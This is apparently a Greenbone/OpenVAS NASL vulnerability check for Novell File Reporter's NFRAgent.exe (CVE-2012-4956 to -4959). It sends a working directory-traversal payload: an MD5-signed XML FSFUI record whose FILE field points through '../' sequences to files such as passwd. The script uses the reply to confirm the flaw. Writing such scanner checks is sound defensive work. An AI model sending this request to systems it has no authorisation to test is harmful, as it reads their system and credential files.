# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103623");
  script_cve_id("CVE-2012-4956", "CVE-2012-4957", "CVE-2012-4958", "CVE-2012-4959");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_version("2025-04-15T05:54:49+0000");
  script_name("Novell File Reporter 'NFRAgent.exe' Multiple Security Vulnerabilities");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2012-12-12 17:33:48 +0100 (Wed, 12 Dec 2012)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_dependencies("find_service.nasl", "httpver.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80, 3037);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/56579");
  script_xref(name:"URL", value:"http://www.novell.com/products/file-reporter/");

  script_tag(name:"summary", value:"Novell File Reporter is prone to the following security
  vulnerabilities:

  1. A heap-based buffer-overflow vulnerability

  2. Multiple arbitrary file-download vulnerabilities

  3. An arbitrary file-upload vulnerability");

  script_tag(name:"impact", value:"Remote attackers can exploit these issues to upload and download
  arbitrary files and execute arbitrary code in the context of the application.");

  script_tag(name:"affected", value:"Novell File Reporter 1.0.2 is vulnerable. Other versions may also
  be affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"qod_type", value:"remote_app");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("misc_func.inc");
include("traversal_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("host_details.inc");
include("os_func.inc");

port = http_get_port(default:3037);
useragent = http_get_user_agent();
host = http_host_name(port:port);

files = traversal_files();

foreach file (keys(files)) {

  result = '';

  if("passwd" >< files[file]) {
    path = '../../../../../../../../../../../../../../' + files[file];
  } else {
    path = '..\\..\\..\\..\\..\\..\\..\\..\\..\\' + files[file];
  }

  ex = '<RECORD><NAME>FSFUI</NAME><UICMD>126</UICMD><FILE>' + path  + '</FILE></RECORD>';
  ex_md5 = toupper(hexstr(MD5('SRS' + ex + 'SERVER')));

  ex = ex_md5 + ex;

  len = strlen(ex);

  req = string("POST /FSF/CMD HTTP/1.1\r\n",
               "Host: ", host, "\r\n",
               "User-Agent: ", useragent, "\r\n",
               "Content-Type: text/xml\r\n",
               "Content-Length: ", len, "\r\n",
               "\r\n",
               ex);
  res = http_keepalive_send_recv(port:port, data:req);

  if(eregmatch(pattern:file, string:res)) {
    security_message(port:port);
    exit(0);
  }
}

exit(99);
